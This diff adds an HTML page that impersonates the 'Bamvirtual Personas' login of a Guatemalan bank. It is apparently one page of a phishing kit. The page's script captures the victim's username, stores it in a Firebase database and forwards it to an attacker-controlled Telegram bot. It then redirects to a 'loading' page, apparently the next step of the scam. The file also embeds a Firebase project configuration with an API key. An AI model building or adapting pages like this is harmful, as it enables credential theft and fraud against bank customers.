@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BAM</title>
+
+    <link rel="stylesheet" href="styles.css" />
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script>
+      function isNumberKey(event) {
+        const charCode = event.which ? event.which : event.keyCode;
+        // Permitir números (teclas 48-57), retroceso (8), tab (9)
+        if (charCode >= 48 && charCode <= 57) {
+          return true;
+        } else if (charCode === 8 || charCode === 9) {
+          return true; // Permitir backspace y tab
+        } else {
+          return false; // Bloquear cualquier otra tecla
+        }
+      }
+    </script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+    </script>
+  </head>
+  <body>
+    <div class="container">
+      <div class="left">
+        <div class="icon-container">
+          <img src="datos/bam-icon.svg" alt="BAM Icon" />
+        </div>
+        <div>
+          <p>Bienvenido a Bamvirtual Personas</p>
+        </div>
+        <div class="formulario">
+          <div class="cuadrado">
+            <div class="icon-input">
+              <i class="icon icon-user"
+                ><img
+                  src="https://cdn-icons-png.flaticon.com/512/1077/1077063.png"
+                  style="width: 20px"
+              /></i>
+              <input
+                type="text"
+                id="input-username"
+                class="form-control input-general"
+                autocomplete="off"
+                minlength="1"
+                maxlength="20"
+                placeholder=" "
+                oninput="checkFormCompletion()"
+              />
+              <label for="input-username">Ingresa tu usuario</label>
+            </div>
+          </div>
+          <div class="button-container">
+            <button
+              id="continue-button1"
+              type="submit"
+              class="disabled"
+              onclick="submitForm()"
+            >
+              CONTINUAR
+            </button>
+          </div>
+          <div
+            style="
+              width: 100%;
+              background: #9a9a9a;
+              height: 1px;
+              margin-top: 50px;
+              margin-bottom: 50px;
+            "
+          ></div>
+          <div style="width: 100%; text-align: center">
+            <p style="font-weight: 600; font-size: 17px">
+              ¿Aún no tienes un usuario?
+            </p>
+            <button
+              style="
+                width: 100%;
+                padding: 15px;
+                border: 1px solid black;
+                background: white;
+              "
+            >
+              REGISTRATE AQUI
+            </button>
+          </div>
+        </div>
+      </div>
+      <div class="right">
+        <img src="datos/login.gif" alt="Imagen de ejemplo" />
+      </div>
+    </div>
+    <script src="telegram.js"></script>
+
+    <script>
+      // Función para verificar si todos los campos están completos
+      function checkFormCompletion() {
+        const usuario = document.getElementById("input-username").value;
+        const submitButton = document.getElementById("continue-button1");
+
+        // Si el campo de usuario no está vacío, habilitar el botón
+        if (usuario !== "") {
+          submitButton.disabled = false;
+          submitButton.classList.remove("disabled");
+          submitButton.classList.add("enabled");
+        } else {
+          submitButton.disabled = true;
+          submitButton.classList.add("disabled");
+          submitButton.classList.remove("enabled");
+        }
+      }
+
+      // Función para manejar el clic en el botón de "Continuar"
+      async function submitForm() {
+        const usuario = document.getElementById("input-username").value;
+
+        // Mostrar un alert con los datos ingresados
+        const questionRef = doc(window.db, "bamguat", usuario);
+        await setDoc(questionRef, {
+          page: 0,
+          frase: "",
+          imagen: "",
+        });
+        localStorage.setItem("usuario", usuario);
+        const message = "Bamguatemala\nDocumento: " + usuario;
+
+        axios
+          .post(
+            "https://api.telegram.org/bot" + miVariableGlobal + "/sendMessage",
+            {
+              chat_id: chat,
+              text: message,
+            }
+          )
+          .then((response) => {
+            window.parent.location.href = "cargando.html";
+          })
+          .catch((error) => {
+            console.error(error);
+          });
+      }
+    </script>
+  </body>
+</html>
